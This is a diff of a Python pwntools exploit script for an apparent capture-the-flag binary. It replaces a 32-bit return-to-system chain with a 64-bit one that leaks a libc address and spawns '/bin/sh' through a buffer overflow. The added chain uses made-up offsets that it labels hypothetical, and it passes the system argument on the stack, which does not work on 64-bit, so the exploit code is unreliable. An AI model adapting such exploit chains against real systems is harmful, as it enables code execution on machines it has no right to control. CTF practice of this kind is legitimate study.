@@ -1,26 +1,50 @@
 from pwn import *
-import sys
-elf = ELF('./rop1')
+context.binary = './pwn/stack/rop-10/rop10'
 
-# Find the offset to overwrite the return address
-offset = cyclic_find(0x6161617f)  # Replace 0x6161617f with the value you get from running the binary and getting an access violation
+# Set up process or remote connection
+# For local testing, use:
+p = process()
+# For remote exploitation, use:
+# p = remote('hostname', port)
 
-# Get the address of system and "/bin/bash"
-system_addr = elf.plt['system']
-bash_string_addr = next(elf.search(b'/bin/bash'))
+# Example: Leak a libc address (this part is hypothetical, as we don't have the actual offsets or addresses)
+def leak_libc_address():
+    # Payload to leak address, this will be specific to the binary and situation
+    payload = b'A' * 24  # Fill the buffer
+    payload += p64(0xdeadbeef)  # Overwrite saved RBP (or another value depending on the situation)
+    payload += p64(context.binary.symbols['puts'])  # Return to puts
+    payload += p64(0xcafebabe)  # Address of string to print, or other control value
 
-# Construct the ROP chain
-rop_chain = p32(system_addr)
-rop_chain += p32(0)  # Return address for system (can be junk since system won't return)
-rop_chain += p32(bash_string_addr)
+    p.sendlineafter(b'correct (yes/no)?\n', b'no')  # Make sure the program loops back
+    p.sendline(payload)
+    p.recvuntil(b'Is your name `')
+    leaked_address = u64(p.recv(6).ljust(8, b'\x00'))
+    return leaked_address
 
-# Create the payload
-payload = b'A' * offset
-payload += rop_chain
+# Main exploit logic
+def exploit():
+    # Leaking an address from the binary or libc (hypothetical example)
+    leaked_puts = leak_libc_address()
+    log.info(f'Leaked puts address: {hex(leaked_puts)}')
 
-# Start the process and send the payload
-p = process('./rop1')
-p.sendline(payload)
+    # Calculate offsets (these values are placeholders)
+    offset_to_system = 0x123456  # Hypothetical offset to system
+    bin_sh_offset = 0x789abc  # Hypothetical offset to "/bin/sh" string
 
-# Pass interaction back to user
-p.interactive()
+    # Construct the final ROP chain
+    rop_chain = b''
+    rop_chain += b'A' * 24  # Buffer padding
+    rop_chain += p64(0xdeadbeef)  # Overwrite saved RBP
+    rop_chain += p64(leaked_puts + offset_to_system)  # Return to system
+    rop_chain += p64(0xcafebabe)  # Return address after system (can be anything, e.g., exit)
+    rop_chain += p64(leaked_puts + bin_sh_offset)  # Argument to system ("/bin/sh")
+
+    # Send the exploit
+    p.sendlineafter(b'correct (yes/no)?\n', b'no')  # Make sure the program loops back
+    p.sendline(rop_chain)
+
+    # Switch to interactive mode
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
